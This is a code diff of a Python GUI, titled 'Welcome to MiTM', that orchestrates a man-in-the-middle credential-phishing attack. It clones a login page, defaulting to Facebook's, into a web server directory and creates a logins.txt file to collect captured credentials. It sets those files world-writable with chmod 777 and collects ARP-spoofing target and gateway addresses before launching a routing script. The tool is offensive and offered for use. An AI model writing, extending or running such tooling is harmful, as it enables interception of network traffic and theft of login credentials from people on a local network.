@@ -4,10 +4,6 @@ import re
 import Tkinter as tk
 import os
 import subprocess
-import shutil
-
-# Need to change /etc/apache2/sites-available/default first if changing this var!!!
-apacheServerDir = "/var/www"
 
 root = tk.Tk()
 
@@ -15,7 +11,7 @@ root.title("Welcome to MiTM")
 
 scrapperLabel = tk.Label(root, text="--------- Scrapper Setup ---------")
 scrapperUrlLabel = tk.Label(root, text="Enter Scrapper URL")
-scrapperOutLabel = tk.Label(root, text="Enter Scrapper Output File Name (Optional)")
+scrapperOutLabel = tk.Label(root, text="Enter Server Directory")
 
 spoofLabel = tk.Label(root, text="--------- ArpSpoof Setup ---------")
 spoofTargetLabel = tk.Label(root, text="Enter ArpSpoof Target's IP Address")
@@ -41,7 +37,7 @@ spoofTargetVar = tk.StringVar()
 spoofHostVar = tk.StringVar()
 
 scrapperUrlVar.set("http://facebook.com/login")
-scrapperOutVar.set("")
+scrapperOutVar.set("/var/www/")
 spoofTargetVar.set("192.168.1.1")
 spoofHostVar.set("192.168.1.0")
 
@@ -63,19 +59,18 @@ def main():
     root.mainloop()
 
 
-errorLabel1 = tk.Label(root, text="Input Error")
-errorLabel2 = tk.Label(root, text="Input Error")
-errorLabel3 = tk.Label(root, text="Input Error")
-errorLabel4 = tk.Label(root, text="Input Error")
+errorLabel1 = tk.Label(root, text="Input Error. Incorrect URL Format")
+errorLabel2 = tk.Label(root, text="Input Error. Specify correct Path.")
+errorLabel3 = tk.Label(root, text="Input Error. Not an IPV4 Address.")
+errorLabel4 = tk.Label(root, text="Input Error. Not an IPV4 Address.")
 
 
 def validate_inputs():
     regexURL = r'^(https?):\/\/(([a-z0-9$_\.\+!\*\'\(\),;\?&=-]|%[0-9a-f]{2})+(:([a-z0-9$_\.\+!\*\'\(\),;\?&=-]|%[0-9a-f]{2})+)?@)?(?#)((([a-z0-9]\.|[a-z0-9][a-z0-9-]*[a-z0-9]\.)*[a-z][a-z0-9-]*[a-z0-9]|((\d|[1-9]\d|1\d{2}|2[0-4][0-9]|25[0-5])\.){3}(\d|[1-9]\d|1\d{2}|2[0-4][0-9]|25[0-5]))(:\d+)?)(((\/+([a-z0-9$_\.\+!\*\'\(\),;:@&=-]|%[0-9a-f]{2})*)*(\?([a-z0-9$_\.\+!\*\'\(\),;:@&=-]|%[0-9a-f]{2})*)?)?)?(#([a-z0-9$_\.\+!\*\'\(\),;:@&=-]|%[0-9a-f]{2})*)?$'
-    regexOUT = r'^[\w,\s-]+(\.[A-Za-z]{1,6})?$'
     regexIPV4 = r'^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)(\.|$)){4}$'
 
     matchScrapperUrl = re.match(regexURL, scrapperUrlEntry.get().strip(), re.M | re.I | re.U)
-    matchScrapperOut = re.match(regexOUT, scrapperOutEntry.get().strip(), re.M | re.I)
+    matchScrapperOut = os.path.exists(os.path.abspath(scrapperOutEntry.get().strip()) + "/")
     matchSpoofTarget = re.match(regexIPV4, spoofTargetEntry.get().strip(), re.M | re.I)
     matchSpoofHost = re.match(regexIPV4, spoofHostEntry.get().strip(), re.M | re.I)
 
@@ -84,8 +79,6 @@ def validate_inputs():
     else:
         errorLabel1.grid(column=0, row=5, columnspan=2, ipadx=2, ipady=2, padx=2, pady=2)
     if matchScrapperOut:
-        errorLabel2.grid_remove()
-    elif not scrapperOutEntry.get().strip():
         errorLabel2.grid_remove()
     else:
         errorLabel2.grid(column=0, row=7, columnspan=2, ipadx=2, ipady=2, padx=2, pady=2)
@@ -102,8 +95,6 @@ def validate_inputs():
 
     if matchScrapperUrl and matchScrapperOut and matchSpoofTarget and matchSpoofHost:
         accept_inputs()
-    elif matchScrapperUrl and not scrapperOutEntry.get().strip() and matchSpoofTarget and matchSpoofHost:
-        accept_inputs()
     else:
         deny_inputs()
 
@@ -114,7 +105,7 @@ def deny_inputs():
 
 def accept_inputs():
     scrapperUrl = scrapperUrlEntry.get().strip()
-    scrapperOut = scrapperOutEntry.get().strip()
+    scrapperOut = os.path.abspath(scrapperOutEntry.get().strip()) + os.sep
     spoofTarget = spoofTargetEntry.get().strip()
     spoofHost = spoofHostEntry.get().strip()
 
@@ -125,11 +116,13 @@ def accept_inputs():
     print p.communicate(), "\n"
 
     if os.path.isfile(scrapperOut + 'login.php') and os.path.isfile(scrapperOut + 'index.html'):
-        shutil.copy(scrapperOut + "index.html", apacheServerDir)
-        shutil.copy(scrapperOut + "login.php", apacheServerDir)
-        if not os.path.exists('logins.txt'):
-            open('logins.txt', 'w').close()
-        shutil.copy("logins.txt", apacheServerDir)
+        if not os.path.exists(scrapperOut + 'logins.txt'):
+            open(scrapperOut + 'logins.txt', 'w').close()
+
+        os.chmod(scrapperOut + "index.html", int("777", 8))
+        os.chmod(scrapperOut + "login.php", int("777", 8))
+        os.chmod(scrapperOut + "logins.txt", int("777", 8))
+
         cmd = "python ./route.py"
         p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
         print cmd
